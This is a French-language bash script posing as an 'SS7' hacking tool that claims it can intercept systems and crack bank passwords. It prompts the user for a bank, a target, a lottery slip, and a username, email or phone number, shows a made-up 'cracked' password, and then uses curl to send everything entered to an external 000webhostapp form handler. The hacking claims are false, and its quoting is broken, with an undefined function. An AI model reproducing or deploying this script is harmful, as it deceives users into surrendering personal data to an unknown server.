#!/bin/bash
clear


voyeYonMesaj(){
clear

        echo 'By: SS7 SECURITY INTERNET PIRATER https://www.reseaux-ss7.io/intercepter'
		
		echo 'Veuillez entrer le nom de la banque que vous souhaitez pirater'
		read remitente
		clear
		
		echo 'Remitente -->' $remitente
		echo 'Veuillez saisir le numéro d'identification de l'ordinateur qui recevra cette attaque'
		read receptor
		clear
		
		echo 'Remitente -->' $remitente
		echo 'Veuillez saisir le numéro d'identification de l'ordinateur qui recevra cette attaque -->' $receptor
		echo 'Bienvenue à SAINT JEAN BOLET... s'il-vous-plaît réalisez votre fiche bolet ici'
		read asunto 
		clear
		
		echo 'Remitente -->' $remitente
		echo 'Veuillez saisir le numéro d'identification de l'ordinateur qui recevra cette attaque -->' $receptor
		echo 'Bienvenue à SAINT JEAN BOLET... s'il-vous-plaît réalisez votre fiche bolet ici -->' $asunto
		echo 'Saisissez le nom d'utilisateur, l'adresse e-mail ou le numéro de téléphone de l'ordinateur'
		read mensaje
		clear
		
		echo 'Remitente -->' $remitente
		echo 'Veuillez saisir le numéro d'identification de l'ordinateur qui recevra cette attaque -->' $receptor
		echo 'Bienvenue à SAINT JEAN BOLET... s'il-vous-plaît réalisez votre fiche bolet ici -->' $asunto
		echo 'Saisissez le nom d'utilisateur, l'adresse e-mail ou le numéro de téléphone de l'ordinateur -->'$mensaje
		echo '¿Votre mot de passe est déjà cracké, 2300452 est votre mot de passe, appuyez sur Y pour continuer et déconnecter l'ordinateur de la centrale? [y/n]' 
		read Seguro
		case $Seguro in
			y)
			curl --data "remitente=$receptor && asunto=$asunto && msj=$mensaje && desde=$remitente" https://insessorial-halls.000webhostapp.com/send.php  
				;;	
			n)
				clear
				Banner 
				menuPrincipal
		esac

}


menuPrincipal(){
clear
	
echo -e '\e[92mBienvini '
echo ''
echo 'Bienvenue sur le réseau SS7, ici vous pouvez intercepter et pirater n'importe quel système. Appuyez sur Y pour continuer'
read opcion
case $opcion in 

	
	y)
	 voyeYonMesaj
	;;
								
	esac

}

Banner 
menuPrincipal
